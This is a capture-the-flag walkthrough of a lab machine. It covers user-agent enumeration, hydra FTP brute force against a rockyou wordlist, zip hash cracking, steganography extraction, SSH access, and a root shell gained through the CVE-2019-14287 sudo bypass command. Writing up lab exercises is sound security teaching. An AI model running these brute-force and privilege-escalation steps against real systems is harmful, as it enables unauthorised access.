## Target IP: `10.10.89.204`

### Port Scan

**Open Ports:**

| Port | Service |
| --- | --- |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

---

### Web Enumeration

- Visiting `http://10.10.89.204` showed a prompt:
    
    ```
    Dear agents,
    
    Use your own codename as user-agent to access the site.
    
    From,
    Agent R
    ```
    
- Tried with curl:

```bash
curl -A "R" -L 10.10.89.204
```

- `A` sets the user-agent
- `L` follows redirects
- `curl` makes HTTP requests (like a terminal-based web browser)
- Response:
    
    ```
    What are you doing! Are you one of the 25 employees? If not, I going to report this incident
    ```
    
- Brute-forced the user-agent with letters of the alphabet.
- Using `A "C"` returned:
    
    ```
    Attention chris,
    
    Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
    
    From,
    Agent R
    ```
    

---

### FTP Brute Force

- Attempted FTP login for `chris`:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.89.204 ftp
```

- Successful login:
    
    **Username:** `chris`
    
    **Password:** `[REDACTED]`
    
- Connected via FTP:
    - `ls` triggered passive mode → disabled with `passive`
    - Files found:
        - `cute-alien.jpg`
        - `cutie.png`
        - `To_agentJ.txt`
- Downloaded all files using:

```bash
get <filename>
```

*(Could have used `mget *` to download all at once)*

---

### Message from Agent C

**To_agentJ.txt**:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

---

### Stego and File Extraction

- Used `binwalk` (tool for looking for hidden things inside files) to analyze `cutie.png`:

```bash
binwalk cutie.png
binwalk -e cutie.png
```

- Found and extracted:
    - `365`
    - `365.zlib`
    - `8702.zip` (password protected)
- Cracked zip password with John:

```bash
zip2john 8702.zip > zip.hash
john zip.hash
```

- Password: `[REDACTED]`
- Unzipped using 7zip due to `unzip` errors:

```bash
7z e 8702.zip
```

- File extracted: `To_agentR.txt`

**Contents:**

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

- Used [CyberChef](https://gchq.github.io/CyberChef/?ref=blog.qz.sg) to decode `QXJlYTUx` (base64) → `Area51`

---

### Hidden Message in JPG

- Investigated `cute-alien.jpg` using steghide (commonly used to hide data inside jpg files with a passphrase):

```bash
steghide info cute-alien.jpg
```

- Found embedded file: `message.txt`

```bash
steghide extract -sf cute-alien.jpg
cat message.txt
```

**message.txt:**

```
Hi james,

Glad you find this message. Your login password is [REDACTED]

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

---

### SSH Login

- SSH login:

```bash
ssh james@10.10.89.204
```

**Credentials:**

- Username: `james`
- Password: `[REDACTED]`
- Found:
    - `Alien_autospy.jpg`
    - `user_flag.txt`
- Downloaded the JPG file using SCP from outside SSH session:

```bash
scp james@10.10.89.204:/home/james/Alien_autospy.jpg .
```

- Reverse image search of the JPG → Flag: `roswell alien autopsy`

---

### Privilege Escalation

- Checked identity and groups:

```bash
whoami
id
```

- `sudo -l` output:

```
(ALL, !root) /bin/bash
```

- Meant James can run `/bin/bash` with sudo for any user *except* root.
- Google search for “(ALL, !root) /bin/bash exploit”
- Found exploit (CVE-2019-14287) that works on sudo < 1.8.28
- Checked sudo version:

```bash
sudo --version
```

- Version: 1.8.21 (machine is vulnerable)
- Downloaded Python exploit to `/tmp`:

```bash
scp ~/Downloads/47502.py james@10.10.89.204:/tmp/
python3 /tmp/47502.py
OR
chmod +x /tmp/47502.py
/tmp/47502.py
```

- This did not work.
- Searched the CVE online and came across a site that gave this command

```bash
sudo -u \#$((0xffffffff)) /bin/bash #  I added the /bin/bash
```

- Bypasses blacklist, spawns root shell.
- Confirmed:

```bash
whoami
```

- `root`
- Located and read `root.txt`
